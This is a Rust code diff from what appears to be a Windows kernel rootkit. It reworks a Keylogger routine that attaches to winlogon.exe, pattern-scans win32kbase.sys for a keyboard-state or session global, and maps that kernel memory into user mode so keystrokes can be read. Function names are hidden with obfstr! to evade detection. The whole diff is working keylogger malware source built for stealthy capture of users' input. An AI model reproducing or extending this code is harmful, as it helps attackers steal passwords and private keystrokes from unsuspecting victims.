@@ -117,49 +117,43 @@ impl Keylogger {
     pub unsafe fn get_user_address_keylogger() -> Result<*mut c_void> {
         // Get the PID of winlogon.exe
         let pid = get_process_by_name(obfstr!("winlogon.exe"))?;
-
         // Attach to the winlogon.exe process
         let winlogon_process = Process::new(pid)?;
-        let attach_process = ProcessAttach::new(winlogon_process.e_process);
-
-        // Retrieve the address of gafAsyncKeyState
-        let gaf_async_key_state_address = Self::get_gafasynckeystate_address()?;
-
-        // Allocate an MDL (Memory Descriptor List) to manage the memory
+        let _attach_guard = ProcessAttach::new(winlogon_process.e_process);
+    
+        // Retrieve the address of gSessionGlobalSlots (instead of gafAsyncKeyState)
+        let session_globals_address = Self::get_sessionglobals_address()?;
+        log::info!("get_user_address_keylogger: Retrieved gSessionGlobalSlots at {:p}", session_globals_address);
+    
+        // Allocate an MDL for the region (adjust size as needed)
         let mdl = IoAllocateMdl(
-            gaf_async_key_state_address.cast(),
-            size_of::<[u8; 64]>() as u32,
+            session_globals_address.cast(),
+            core::mem::size_of::<[u8; 64]>() as u32,
             0,
             0,
-            null_mut(),
+            core::ptr::null_mut(),
         );
         if mdl.is_null() {
-            return Err(ShadowError::FunctionExecutionFailed(
-                "IoAllocateMdl",
-                line!(),
-            ));
+            return Err(ShadowError::FunctionExecutionFailed("IoAllocateMdl", line!()));
         }
-
-        // Build the MDL for the non-paged pool
+    
+        // Prepare the MDL for nonpaged pool mapping
         MmBuildMdlForNonPagedPool(mdl);
-
+    
         // Map the locked pages into user-mode address space
         let address = MmMapLockedPagesSpecifyCache(
             mdl,
             UserMode as i8,
             MmCached,
-            null_mut(),
+            core::ptr::null_mut(),
             0,
             NormalPagePriority as u32,
         );
         if address.is_null() {
             IoFreeMdl(mdl);
-            return Err(ShadowError::FunctionExecutionFailed(
-                "MmMapLockedPagesSpecifyCache",
-                line!(),
-            ));
+            return Err(ShadowError::FunctionExecutionFailed("MmMapLockedPagesSpecifyCache", line!()));
         }
-
+    
         Ok(address)
     }
 
@@ -169,17 +163,21 @@ impl Keylogger {
     ///
     /// * `Ok(*mut u8)` - Returns a pointer to the `gafAsyncKeyState` array if found.
     /// * `Err(ShadowError)` - If the array is not found or an error occurs during the search.
-    unsafe fn get_gafasynckeystate_address() -> Result<*mut u8> {
+    unsafe fn get_sessionglobals_address() -> Result<*mut u8> {
         // Get the base address of win32kbase.sys
         let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
-
-        // Get the address of the NtUserGetAsyncKeyState function
-        let function_address =
-            get_function_address(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
-
-        // Search for the pattern that identifies the gafAsyncKeyState array
-        // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
-        let pattern = [0x48, 0x8B, 0x05];
-        scan_for_pattern(function_address, &pattern, 3, 7, 0x200)
+        // Get the address of the W32GetSessionStateForSession function
+        let function_address = get_function_address(obfstr!("W32GetSessionStateForSession"), module_address)?;
+        log::info!("get_sessionglobals_address: W32GetSessionStateForSession at {:p}", function_address);
+    
+        // Define the pattern that identifies the instruction loading gSessionGlobalSlots.
+        // In W32GetSessionStateForSession+0x14, you see an instruction like:
+        //   488b05e1cf0600  mov rax, qword ptr [win32k!gSessionGlobalSlots]
+        // We’ll use the first three bytes ("48 8B 05") as our pattern.
+        const SESSION_GLOBALS_PATTERN: [u8; 3] = [0x48, 0x8B, 0x05];
+        // Use scan_for_pattern with chosen parameters (offset=3, final_offset=7, search size=0x100)
+        let address = scan_for_pattern(function_address, &SESSION_GLOBALS_PATTERN, 3, 7, 0x100)?;
+        log::info!("get_sessionglobals_address: Pattern found; computed address: {:p}", address);
+        Ok(address)
     }
 }
